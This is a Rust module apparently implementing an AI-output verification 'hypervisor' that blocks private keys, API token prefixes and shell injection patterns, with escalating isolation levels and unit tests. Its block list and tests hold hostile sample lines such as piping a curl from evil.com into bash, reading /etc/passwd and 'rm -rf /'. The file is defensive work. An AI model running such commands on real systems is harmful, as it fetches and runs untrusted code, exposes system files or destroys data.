//! # Antimatrix — Formal Verification Hypervisor
//!
//! The Antimatrix enforces Dream Nova's Constitutional Spec-Driven
//! Development (CSDD) model.  Every AI-generated output, code mutation,
//! and network message is validated against a **constitutional specification**
//! before being committed.
//!
//! ## Isolation levels
//!
//! The hypervisor maintains six escalating isolation levels:
//!
//! | Level | Name          | Description                                         |
//! |-------|---------------|-----------------------------------------------------|
//! | 0     | Standard      | Normal operation — all checks pass                  |
//! | 1     | Probation     | Minor violation detected — extra logging enabled    |
//! | 2     | Severed       | Moderate violation — network access revoked         |
//! | 3     | Offline       | Serious violation — all I/O suspended               |
//! | 4     | Decapitation  | Critical violation — execution halted, core dumped  |
//! | 5     | Immolation    | Catastrophic — full state wipe and re-attestation   |
//!
//! ## Security rules
//!
//! - **SEC-NOVA-001**: No private key may appear in any output.
//! - **SEC-NOVA-002**: All AI outputs must be deterministically reproducible.
//! - **SEC-NOVA-003**: Memory allocations must be bounded (no unbounded growth).
//! - **SEC-NOVA-004**: Nullifier reuse is forbidden (double-spend prevention).
//! - **SEC-NOVA-005**: No shell injection patterns (backticks, `$(...)`, `; rm`, `| bash`).
//! - **SEC-NOVA-006**: No API token / bearer credential patterns in output.

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::{HashMap, HashSet};
use std::time::{SystemTime, UNIX_EPOCH};

// ---------------------------------------------------------------------------
// Error types
// ---------------------------------------------------------------------------

#[derive(Debug, thiserror::Error)]
pub enum AntimatrixError {
    #[error("security violation: {rule} — {description}")]
    SecurityViolation {
        rule: String,
        description: String,
    },

    #[error("isolation level escalated to {0:?}")]
    IsolationEscalated(IsolationLevel),

    #[error("operation forbidden at isolation level {0:?}")]
    OperationForbidden(IsolationLevel),

    #[error("constitutional rule not found: {0}")]
    RuleNotFound(String),
}

pub type Result<T> = std::result::Result<T, AntimatrixError>;

// ---------------------------------------------------------------------------
// Isolation levels
// ---------------------------------------------------------------------------

/// The six isolation levels of the Antimatrix hypervisor.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[repr(u8)]
pub enum IsolationLevel {
    /// Normal operation.
    Standard = 0,
    /// Minor violation — extra logging.
    Probation = 1,
    /// Moderate violation — network revoked.
    Severed = 2,
    /// Serious violation — all I/O suspended.
    Offline = 3,
    /// Critical violation — execution halted.
    Decapitation = 4,
    /// Catastrophic — full wipe.
    Immolation = 5,
}

impl IsolationLevel {
    /// Whether the level permits network access.
    pub fn allows_network(&self) -> bool {
        matches!(self, IsolationLevel::Standard | IsolationLevel::Probation)
    }

    /// Whether the level permits any I/O at all.
    pub fn allows_io(&self) -> bool {
        matches!(
            self,
            IsolationLevel::Standard | IsolationLevel::Probation | IsolationLevel::Severed
        )
    }

    /// Whether execution should continue.
    pub fn allows_execution(&self) -> bool {
        (*self as u8) < (IsolationLevel::Decapitation as u8)
    }
}

impl std::fmt::Display for IsolationLevel {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let name = match self {
            IsolationLevel::Standard => "Standard",
            IsolationLevel::Probation => "Probation",
            IsolationLevel::Severed => "Severed",
            IsolationLevel::Offline => "Offline",
            IsolationLevel::Decapitation => "Decapitation",
            IsolationLevel::Immolation => "Immolation",
        };
        write!(f, "{name}")
    }
}

// ---------------------------------------------------------------------------
// Security violations
// ---------------------------------------------------------------------------

/// A recorded security violation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityViolation {
    /// Rule identifier (e.g., "SEC-NOVA-001").
    pub rule: String,
    /// Human-readable description.
    pub description: String,
    /// Severity (maps to the isolation level it triggers).
    pub severity: IsolationLevel,
    /// Unix timestamp of detection.
    pub timestamp: u64,
    /// SHA-256 hash of the offending content (for audit trail).
    pub content_hash: [u8; 32],
}

impl SecurityViolation {
    fn new(rule: &str, description: &str, severity: IsolationLevel, content: &[u8]) -> Self {
        let content_hash: [u8; 32] = Sha256::digest(content).into();
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
        Self {
            rule: rule.to_string(),
            description: description.to_string(),
            severity,
            timestamp,
            content_hash,
        }
    }
}

// ---------------------------------------------------------------------------
// Constitutional rules
// ---------------------------------------------------------------------------

/// A constitutional rule that can be checked against content.
#[derive(Debug, Clone)]
pub struct ConstitutionalRule {
    /// Unique rule identifier.
    pub id: String,
    /// Human-readable description.
    pub description: String,
    /// The severity if this rule is violated.
    pub violation_severity: IsolationLevel,
    /// The checker function type.
    pub check_type: RuleCheckType,
}

/// The type of check a rule performs.
#[derive(Debug, Clone)]
pub enum RuleCheckType {
    /// Content must NOT contain any of these byte patterns.
    ForbiddenPatterns(Vec<Vec<u8>>),
    /// Content length must be below this threshold.
    MaxLength(usize),
    /// Content hash must match a known-good set.
    AllowedHashes(Vec<[u8; 32]>),
    /// SEC-NOVA-002: content must hash to the same value as previously seen
    /// for the given input_id. The input_id is SHA-256(input_parameters).
    DeterminismCheck,
    /// SEC-NOVA-004: content contains a 32-byte nullifier that must not be reused.
    /// The nullifier is extracted as SHA-256(content) for simplicity.
    NullifierCheck,
}

// ---------------------------------------------------------------------------
// Constitutional Verifier (stateless rules only)
// ---------------------------------------------------------------------------

/// The constitutional verifier holds stateless rules and checks content.
pub struct ConstitutionalVerifier {
    rules: HashMap<String, ConstitutionalRule>,
}

impl ConstitutionalVerifier {
    /// Create a verifier with the default Dream Nova rules.
    pub fn with_default_rules() -> Self {
        let mut verifier = Self {
            rules: HashMap::new(),
        };

        // SEC-NOVA-001: No private key patterns in output.
        verifier.add_rule(ConstitutionalRule {
            id: "SEC-NOVA-001".into(),
            description: "No private key material in output".into(),
            violation_severity: IsolationLevel::Decapitation,
            check_type: RuleCheckType::ForbiddenPatterns(vec![
                b"-----BEGIN PRIVATE KEY-----".to_vec(),
                b"-----BEGIN RSA PRIVATE KEY-----".to_vec(),
                b"-----BEGIN EC PRIVATE KEY-----".to_vec(),
                b"PRIVATE KEY".to_vec(),
            ]),
        });

        // SEC-NOVA-002: Deterministic output (stateful — handled by Hypervisor).
        verifier.add_rule(ConstitutionalRule {
            id: "SEC-NOVA-002".into(),
            description: "AI outputs must be deterministically reproducible".into(),
            violation_severity: IsolationLevel::Probation,
            check_type: RuleCheckType::DeterminismCheck,
        });

        // SEC-NOVA-003: Bounded memory.
        verifier.add_rule(ConstitutionalRule {
            id: "SEC-NOVA-003".into(),
            description: "Memory allocations must be bounded".into(),
            violation_severity: IsolationLevel::Severed,
            check_type: RuleCheckType::MaxLength(64 * 1024 * 1024), // 64 MiB
        });

        // SEC-NOVA-004: Nullifier reuse (stateful — handled by Hypervisor).
        verifier.add_rule(ConstitutionalRule {
            id: "SEC-NOVA-004".into(),
            description: "Nullifier reuse is forbidden".into(),
            violation_severity: IsolationLevel::Decapitation,
            check_type: RuleCheckType::NullifierCheck,
        });

        // SEC-NOVA-005: No shell injection patterns.
        verifier.add_rule(ConstitutionalRule {
            id: "SEC-NOVA-005".into(),
            description: "Shell injection pattern detected in output".into(),
            violation_severity: IsolationLevel::Decapitation,
            check_type: RuleCheckType::ForbiddenPatterns(vec![
                b"`".to_vec(),               // backtick execution
                b"$((".to_vec(),             // arithmetic expansion
                b"$(".to_vec(),              // command substitution
                b"; rm ".to_vec(),           // chained remove
                b"| bash".to_vec(),          // pipe to shell
                b"| sh".to_vec(),            // pipe to sh
                b"|bash".to_vec(),           // pipe to shell (no space)
                b"|sh".to_vec(),             // pipe to sh (no space)
                b">/dev/null".to_vec(),      // output redirect to null
                b"2>&1".to_vec(),            // stderr redirect
            ]),
        });

        // SEC-NOVA-006: No API token / bearer credential patterns.
        verifier.add_rule(ConstitutionalRule {
            id: "SEC-NOVA-006".into(),
            description: "API token or bearer credential detected in output".into(),
            violation_severity: IsolationLevel::Decapitation,
            check_type: RuleCheckType::ForbiddenPatterns(vec![
                b"sk_live_".to_vec(),        // Stripe live secret key
                b"sk_test_".to_vec(),        // Stripe test secret key
                b"ghp_".to_vec(),            // GitHub personal access token
                b"ghs_".to_vec(),            // GitHub app installation token
                b"vcp_".to_vec(),            // Vercel token prefix
                b"AIzaSy".to_vec(),          // Google API key
                b"Bearer eyJ".to_vec(),      // JWT bearer token
                b"AKIA".to_vec(),            // AWS access key ID prefix
                b"xoxb-".to_vec(),           // Slack bot token
                b"xoxp-".to_vec(),           // Slack user token
            ]),
        });

        verifier
    }

    /// Create an empty verifier with no rules.
    pub fn empty() -> Self {
        Self {
            rules: HashMap::new(),
        }
    }

    /// Add a rule to the verifier.
    pub fn add_rule(&mut self, rule: ConstitutionalRule) {
        self.rules.insert(rule.id.clone(), rule);
    }

    /// Number of rules.
    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }

    /// Check content against a specific stateless rule.
    /// Returns `None` for stateful rules (DeterminismCheck, NullifierCheck) —
    /// those are handled by `AntimatrixHypervisor`.
    pub fn check_rule(&self, rule_id: &str, content: &[u8]) -> Result<()> {
        let rule = self
            .rules
            .get(rule_id)
            .ok_or_else(|| AntimatrixError::RuleNotFound(rule_id.into()))?;

        match &rule.check_type {
            RuleCheckType::ForbiddenPatterns(patterns) => {
                for pattern in patterns {
                    if contains_pattern(content, pattern) {
                        return Err(AntimatrixError::SecurityViolation {
                            rule: rule.id.clone(),
                            description: rule.description.clone(),
                        });
                    }
                }
            }
            RuleCheckType::MaxLength(max) => {
                if content.len() > *max {
                    return Err(AntimatrixError::SecurityViolation {
                        rule: rule.id.clone(),
                        description: format!(
                            "{}: {} bytes exceeds limit of {}",
                            rule.description,
                            content.len(),
                            max
                        ),
                    });
                }
            }
            RuleCheckType::AllowedHashes(hashes) => {
                let content_hash: [u8; 32] = Sha256::digest(content).into();
                if !hashes.contains(&content_hash) {
                    return Err(AntimatrixError::SecurityViolation {
                        rule: rule.id.clone(),
                        description: rule.description.clone(),
                    });
                }
            }
            // Stateful rules — deferred to AntimatrixHypervisor.
            RuleCheckType::DeterminismCheck | RuleCheckType::NullifierCheck => {}
        }

        Ok(())
    }

    /// Rules iterator (used by Hypervisor to enumerate stateful rules).
    pub fn rules(&self) -> impl Iterator<Item = &ConstitutionalRule> {
        self.rules.values()
    }
}

impl Default for ConstitutionalVerifier {
    fn default() -> Self {
        Self::with_default_rules()
    }
}

/// Simple substring search (no regex dependency).
fn contains_pattern(haystack: &[u8], needle: &[u8]) -> bool {
    if needle.is_empty() || needle.len() > haystack.len() {
        return needle.is_empty();
    }
    haystack.windows(needle.len()).any(|w| w == needle)
}

// ---------------------------------------------------------------------------
// Nullifier Registry (SEC-NOVA-004)
// ---------------------------------------------------------------------------

/// Tracks seen nullifiers to prevent double-spend / replay.
///
/// A nullifier is derived as SHA-256(content) for AI output validation,
/// or supplied directly for ZKP flows.
#[derive(Debug, Default)]
pub struct NullifierRegistry {
    seen: HashSet<[u8; 32]>,
}

impl NullifierRegistry {
    pub fn new() -> Self {
        Self::default()
    }

    /// Derive nullifier from content and record it.
    /// Returns `true` if this is the first time we see this nullifier (clean),
    /// `false` if it was already seen (reuse = violation).
    pub fn register_content(&mut self, content: &[u8]) -> bool {
        let nullifier: [u8; 32] = Sha256::digest(content).into();
        self.register_nullifier(nullifier)
    }

    /// Record a raw 32-byte nullifier.
    /// Returns `true` if new, `false` if reused.
    pub fn register_nullifier(&mut self, nullifier: [u8; 32]) -> bool {
        self.seen.insert(nullifier)
    }

    /// Check without registering.
    pub fn is_reused(&self, nullifier: &[u8; 32]) -> bool {
        self.seen.contains(nullifier)
    }

    pub fn count(&self) -> usize {
        self.seen.len()
    }
}

// ---------------------------------------------------------------------------
// Determinism Registry (SEC-NOVA-002)
// ---------------------------------------------------------------------------

/// Tracks (input_id → expected_output_hash) mappings to detect non-determinism.
///
/// For AI validation: `input_id` = SHA-256(prompt || seed),
/// `output_hash` = SHA-256(ai_output).
/// If the same `input_id` produces a different `output_hash`, SEC-002 fires.
#[derive(Debug, Default)]
pub struct DeterminismRegistry {
    /// Maps input_id → first observed output_hash.
    registry: HashMap<[u8; 32], [u8; 32]>,
}

impl DeterminismRegistry {
    pub fn new() -> Self {
        Self::default()
    }

    /// Register an (input_id, output) pair.
    ///
    /// - First time: stores the output hash. Returns `Ok(())`.
    /// - Subsequent times: checks that the output hash matches. Returns `Err` on mismatch.
    pub fn register(&mut self, input_id: [u8; 32], output: &[u8]) -> std::result::Result<(), NonDeterminismError> {
        let output_hash: [u8; 32] = Sha256::digest(output).into();
        match self.registry.get(&input_id) {
            None => {
                self.registry.insert(input_id, output_hash);
                Ok(())
            }
            Some(&expected) => {
                if expected == output_hash {
                    Ok(())
                } else {
                    Err(NonDeterminismError { input_id, expected, got: output_hash })
                }
            }
        }
    }

    pub fn entry_count(&self) -> usize {
        self.registry.len()
    }
}

/// Error returned when the same input produces a different output.
#[derive(Debug)]
pub struct NonDeterminismError {
    pub input_id: [u8; 32],
    pub expected: [u8; 32],
    pub got: [u8; 32],
}

impl std::fmt::Display for NonDeterminismError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "non-determinism detected for input {:?}: expected {:?}, got {:?}",
            &self.input_id[..4],
            &self.expected[..4],
            &self.got[..4],
        )
    }
}

// ---------------------------------------------------------------------------
// Antimatrix Hypervisor
// ---------------------------------------------------------------------------

/// The Antimatrix Hypervisor monitors system state and enforces isolation.
pub struct AntimatrixHypervisor {
    /// Current isolation level.
    pub level: IsolationLevel,
    /// The constitutional verifier (stateless rules).
    pub verifier: ConstitutionalVerifier,
    /// Violation log (append-only).
    pub violations: Vec<SecurityViolation>,
    /// Maximum violations before auto-escalation.
    pub max_violations_per_level: usize,
    /// SEC-NOVA-004: nullifier registry.
    pub nullifiers: NullifierRegistry,
    /// SEC-NOVA-002: determinism registry.
    pub determinism: DeterminismRegistry,
}

impl AntimatrixHypervisor {
    /// Create a new hypervisor at Standard isolation with default rules.
    pub fn new() -> Self {
        Self {
            level: IsolationLevel::Standard,
            verifier: ConstitutionalVerifier::with_default_rules(),
            violations: Vec::new(),
            max_violations_per_level: 3,
            nullifiers: NullifierRegistry::new(),
            determinism: DeterminismRegistry::new(),
        }
    }

    /// Validate AI output against the constitution.
    ///
    /// Checks all stateless rules, then the stateful SEC-002 and SEC-004.
    /// `input_id` is the SHA-256 of the prompt/seed used to generate `output`.
    /// Pass `None` to skip the SEC-002 determinism check.
    pub fn validate_ai_output(
        &mut self,
        output: &[u8],
        input_id: Option<[u8; 32]>,
    ) -> Vec<SecurityViolation> {
        let mut violations = Vec::new();

        // --- Stateless rules (SEC-001, SEC-003, AllowedHashes, ForbiddenPatterns) ---
        for rule in self.verifier.rules() {
            match rule.check_type {
                RuleCheckType::DeterminismCheck | RuleCheckType::NullifierCheck => continue,
                _ => {}
            }
            if self.verifier.check_rule(&rule.id, output).is_err() {
                violations.push(SecurityViolation::new(
                    &rule.id,
                    &rule.description,
                    rule.violation_severity,
                    output,
                ));
            }
        }

        // --- SEC-NOVA-002: Determinism check ---
        if let Some(id) = input_id {
            if let Err(e) = self.determinism.register(id, output) {
                violations.push(SecurityViolation::new(
                    "SEC-NOVA-002",
                    &format!("Non-deterministic output: {e}"),
                    IsolationLevel::Probation,
                    output,
                ));
            }
        }

        // --- SEC-NOVA-004: Nullifier reuse check ---
        let nullifier: [u8; 32] = Sha256::digest(output).into();
        if !self.nullifiers.register_nullifier(nullifier) {
            violations.push(SecurityViolation::new(
                "SEC-NOVA-004",
                "Nullifier reuse detected — identical output submitted twice",
                IsolationLevel::Decapitation,
                output,
            ));
        }

        for v in &violations {
            self.record_violation(v.clone());
        }

        violations
    }

    /// Check compliance of arbitrary content. Returns `Ok(())` if clean.
    /// Uses `None` for input_id (skips SEC-002).
    pub fn check_compliance(&mut self, content: &[u8]) -> Result<()> {
        let violations = self.validate_ai_output(content, None);
        if violations.is_empty() {
            Ok(())
        } else {
            let worst = violations
                .iter()
                .map(|v| v.severity)
                .max()
                .unwrap_or(IsolationLevel::Standard);
            Err(AntimatrixError::SecurityViolation {
                rule: violations[0].rule.clone(),
                description: format!(
                    "{} violation(s) detected, worst severity: {worst}",
                    violations.len()
                ),
            })
        }
    }

    /// Register a nullifier explicitly (for ZKP flows where the nullifier
    /// is derived externally, not from content hash).
    pub fn register_nullifier(&mut self, nullifier: [u8; 32]) -> Result<()> {
        if !self.nullifiers.register_nullifier(nullifier) {
            let v = SecurityViolation::new(
                "SEC-NOVA-004",
                "Explicit nullifier reuse detected",
                IsolationLevel::Decapitation,
                &nullifier,
            );
            self.record_violation(v);
            return Err(AntimatrixError::SecurityViolation {
                rule: "SEC-NOVA-004".into(),
                description: "Nullifier already spent".into(),
            });
        }
        Ok(())
    }

    /// Record a violation and potentially escalate.
    fn record_violation(&mut self, violation: SecurityViolation) {
        // Immediately escalate to the violation's severity if it's higher.
        if violation.severity > self.level {
            self.level = violation.severity;
        }

        self.violations.push(violation);

        // Auto-escalate if too many violations at the current level.
        let count_at_level = self
            .violations
            .iter()
            .filter(|v| v.severity == self.level)
            .count();

        if count_at_level >= self.max_violations_per_level && self.level.allows_execution() {
            self.escalate();
        }
    }

    /// Escalate to the next isolation level.
    fn escalate(&mut self) {
        self.level = match self.level {
            IsolationLevel::Standard => IsolationLevel::Probation,
            IsolationLevel::Probation => IsolationLevel::Severed,
            IsolationLevel::Severed => IsolationLevel::Offline,
            IsolationLevel::Offline => IsolationLevel::Decapitation,
            IsolationLevel::Decapitation => IsolationLevel::Immolation,
            IsolationLevel::Immolation => IsolationLevel::Immolation,
        };
    }

    /// Manually reset to Standard (requires re-attestation in production).
    pub fn reset_isolation(&mut self) {
        self.level = IsolationLevel::Standard;
        self.violations.clear();
        self.nullifiers = NullifierRegistry::new();
        self.determinism = DeterminismRegistry::new();
    }

    /// Whether the system is allowed to continue executing.
    pub fn can_execute(&self) -> bool {
        self.level.allows_execution()
    }

    /// Whether network access is permitted.
    pub fn can_network(&self) -> bool {
        self.level.allows_network()
    }

    /// Number of recorded violations.
    pub fn violation_count(&self) -> usize {
        self.violations.len()
    }
}

impl Default for AntimatrixHypervisor {
    fn default() -> Self {
        Self::new()
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn input_id(seed: &[u8]) -> [u8; 32] {
        Sha256::digest(seed).into()
    }

    #[test]
    fn test_isolation_levels_ordering() {
        assert!(IsolationLevel::Standard < IsolationLevel::Probation);
        assert!(IsolationLevel::Probation < IsolationLevel::Severed);
        assert!(IsolationLevel::Severed < IsolationLevel::Offline);
        assert!(IsolationLevel::Offline < IsolationLevel::Decapitation);
        assert!(IsolationLevel::Decapitation < IsolationLevel::Immolation);
    }

    #[test]
    fn test_isolation_permissions() {
        assert!(IsolationLevel::Standard.allows_network());
        assert!(IsolationLevel::Probation.allows_network());
        assert!(!IsolationLevel::Severed.allows_network());

        assert!(IsolationLevel::Severed.allows_io());
        assert!(!IsolationLevel::Offline.allows_io());

        assert!(IsolationLevel::Offline.allows_execution());
        assert!(!IsolationLevel::Decapitation.allows_execution());
    }

    #[test]
    fn test_clean_content() {
        let mut hypervisor = AntimatrixHypervisor::new();
        let content = b"Hello, this is safe content.";
        let violations = hypervisor.validate_ai_output(content, None);
        assert!(violations.is_empty());
        assert_eq!(hypervisor.level, IsolationLevel::Standard);
    }

    #[test]
    fn test_private_key_detection() {
        let mut hypervisor = AntimatrixHypervisor::new();
        let bad_content = b"Here is a -----BEGIN PRIVATE KEY----- secret";
        let violations = hypervisor.validate_ai_output(bad_content, None);
        assert!(!violations.is_empty());
        assert!(violations.iter().any(|v| v.rule == "SEC-NOVA-001"));
        assert_eq!(hypervisor.level, IsolationLevel::Decapitation);
    }

    #[test]
    fn test_oversized_content() {
        let mut hypervisor = AntimatrixHypervisor::new();
        let big = vec![0u8; 65 * 1024 * 1024]; // 65 MiB > 64 MiB limit
        let violations = hypervisor.validate_ai_output(&big, None);
        assert!(violations.iter().any(|v| v.rule == "SEC-NOVA-003"));
    }

    #[test]
    fn test_compliance_ok() {
        let mut hypervisor = AntimatrixHypervisor::new();
        assert!(hypervisor.check_compliance(b"clean unique content xyz").is_ok());
    }

    #[test]
    fn test_compliance_fail() {
        let mut hypervisor = AntimatrixHypervisor::new();
        let result = hypervisor.check_compliance(b"leak: PRIVATE KEY inside");
        assert!(result.is_err());
    }

    // --- SEC-NOVA-002: Determinism ---

    #[test]
    fn test_sec002_deterministic_pass() {
        let mut hypervisor = AntimatrixHypervisor::new();
        let id = input_id(b"prompt:hello seed:42");
        let output = b"The answer is 42.";
        // First call: register.
        let v1 = hypervisor.validate_ai_output(output, Some(id));
        assert!(!v1.iter().any(|v| v.rule == "SEC-NOVA-002"), "First call should pass SEC-002");
        // Second call with same input_id + same output: passes.
        // Reset nullifier to avoid SEC-004 false positive.
        hypervisor.nullifiers = NullifierRegistry::new();
        let v2 = hypervisor.validate_ai_output(output, Some(id));
        assert!(!v2.iter().any(|v| v.rule == "SEC-NOVA-002"), "Same output should pass SEC-002");
    }

    #[test]
    fn test_sec002_non_deterministic_fail() {
        let mut hypervisor = AntimatrixHypervisor::new();
        let id = input_id(b"prompt:hello seed:42");
        // Register first output.
        hypervisor.validate_ai_output(b"output version A", Some(id));
        // Same input_id, different output → SEC-002 violation.
        hypervisor.nullifiers = NullifierRegistry::new(); // isolate SEC-004
        let violations = hypervisor.validate_ai_output(b"output version B", Some(id));
        assert!(
            violations.iter().any(|v| v.rule == "SEC-NOVA-002"),
            "Different output for same input_id must trigger SEC-002"
        );
    }

    // --- SEC-NOVA-004: Nullifier reuse ---

    #[test]
    fn test_sec004_first_nullifier_ok() {
        let mut hypervisor = AntimatrixHypervisor::new();
        let violations = hypervisor.validate_ai_output(b"fresh unique payload abc123", None);
        assert!(!violations.iter().any(|v| v.rule == "SEC-NOVA-004"));
    }

    #[test]
    fn test_sec004_reused_content_fails() {
        let mut hypervisor = AntimatrixHypervisor::new();
        let content = b"exact same content submitted twice";
        hypervisor.validate_ai_output(content, None);
        let violations = hypervisor.validate_ai_output(content, None);
        assert!(
            violations.iter().any(|v| v.rule == "SEC-NOVA-004"),
            "Identical content resubmission must trigger SEC-004"
        );
        assert_eq!(hypervisor.level, IsolationLevel::Decapitation);
    }

    #[test]
    fn test_sec004_explicit_nullifier_reuse() {
        let mut hypervisor = AntimatrixHypervisor::new();
        let nullifier = [0xABu8; 32];
        assert!(hypervisor.register_nullifier(nullifier).is_ok());
        assert!(hypervisor.register_nullifier(nullifier).is_err());
    }

    #[test]
    fn test_sec004_different_contents_ok() {
        let mut hypervisor = AntimatrixHypervisor::new();
        let v1 = hypervisor.validate_ai_output(b"content alpha", None);
        let v2 = hypervisor.validate_ai_output(b"content beta", None);
        assert!(!v1.iter().any(|v| v.rule == "SEC-NOVA-004"));
        assert!(!v2.iter().any(|v| v.rule == "SEC-NOVA-004"));
    }

    // --- Registry unit tests ---

    #[test]
    fn test_nullifier_registry() {
        let mut reg = NullifierRegistry::new();
        let n = [0x01u8; 32];
        assert!(reg.register_nullifier(n), "first insert should return true");
        assert!(!reg.register_nullifier(n), "second insert should return false");
        assert_eq!(reg.count(), 1);
    }

    #[test]
    fn test_determinism_registry_consistent() {
        let mut reg = DeterminismRegistry::new();
        let id = [0x01u8; 32];
        assert!(reg.register(id, b"output").is_ok());
        assert!(reg.register(id, b"output").is_ok(), "same output = ok");
        assert!(reg.register(id, b"different").is_err(), "different output = err");
    }

    #[test]
    fn test_reset_clears_state() {
        let mut hypervisor = AntimatrixHypervisor::new();
        hypervisor.validate_ai_output(b"PRIVATE KEY leak", None);
        assert_eq!(hypervisor.level, IsolationLevel::Decapitation);
        hypervisor.reset_isolation();
        assert_eq!(hypervisor.level, IsolationLevel::Standard);
        assert_eq!(hypervisor.violation_count(), 0);
        assert_eq!(hypervisor.nullifiers.count(), 0);
        assert_eq!(hypervisor.determinism.entry_count(), 0);
    }

    #[test]
    fn test_verifier_default_has_six_rules() {
        let verifier = ConstitutionalVerifier::with_default_rules();
        assert_eq!(verifier.rule_count(), 6);
    }

    // --- SEC-NOVA-005: Shell injection ---

    #[test]
    fn test_sec005_backtick_detected() {
        let mut h = AntimatrixHypervisor::new();
        let v = h.validate_ai_output(b"run this: `rm -rf /`", None);
        assert!(v.iter().any(|x| x.rule == "SEC-NOVA-005"), "backtick must trigger SEC-005");
        assert_eq!(h.level, IsolationLevel::Decapitation);
    }

    #[test]
    fn test_sec005_command_substitution_detected() {
        let mut h = AntimatrixHypervisor::new();
        let v = h.validate_ai_output(b"output=$(cat /etc/passwd)", None);
        assert!(v.iter().any(|x| x.rule == "SEC-NOVA-005"));
    }

    #[test]
    fn test_sec005_pipe_to_bash_detected() {
        let mut h = AntimatrixHypervisor::new();
        let v = h.validate_ai_output(b"curl http://evil.com | bash", None);
        assert!(v.iter().any(|x| x.rule == "SEC-NOVA-005"));
    }

    #[test]
    fn test_sec005_clean_content_passes() {
        let mut h = AntimatrixHypervisor::new();
        let v = h.validate_ai_output(b"The shell is a unix concept.", None);
        assert!(!v.iter().any(|x| x.rule == "SEC-NOVA-005"));
    }

    // --- SEC-NOVA-006: API tokens ---

    #[test]
    fn test_sec006_stripe_live_key_detected() {
        let mut h = AntimatrixHypervisor::new();
        let v = h.validate_ai_output(b"key: sk_live_abcdef123456", None);
        assert!(v.iter().any(|x| x.rule == "SEC-NOVA-006"), "Stripe live key must trigger SEC-006");
        assert_eq!(h.level, IsolationLevel::Decapitation);
    }

    #[test]
    fn test_sec006_github_token_detected() {
        let mut h = AntimatrixHypervisor::new();
        let v = h.validate_ai_output(b"token=ghp_XXXXXXXXXXXX", None);
        assert!(v.iter().any(|x| x.rule == "SEC-NOVA-006"));
    }

    #[test]
    fn test_sec006_aws_key_detected() {
        let mut h = AntimatrixHypervisor::new();
        let v = h.validate_ai_output(b"AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE", None);
        assert!(v.iter().any(|x| x.rule == "SEC-NOVA-006"));
    }

    #[test]
    fn test_sec006_clean_content_passes() {
        let mut h = AntimatrixHypervisor::new();
        let v = h.validate_ai_output(b"No credentials here, just text.", None);
        assert!(!v.iter().any(|x| x.rule == "SEC-NOVA-006"));
    }

    #[test]
    fn test_contains_pattern() {
        assert!(contains_pattern(b"hello world", b"world"));
        assert!(!contains_pattern(b"hello", b"world"));
        assert!(contains_pattern(b"abc", b"")); // empty pattern
    }

    #[test]
    fn test_custom_rule() {
        let mut verifier = ConstitutionalVerifier::empty();
        verifier.add_rule(ConstitutionalRule {
            id: "CUSTOM-001".into(),
            description: "No cats".into(),
            violation_severity: IsolationLevel::Probation,
            check_type: RuleCheckType::ForbiddenPatterns(vec![b"cat".to_vec()]),
        });
        assert!(verifier.check_rule("CUSTOM-001", b"I have a cat").is_err());
        assert!(verifier.check_rule("CUSTOM-001", b"I have a dog").is_ok());
    }
}
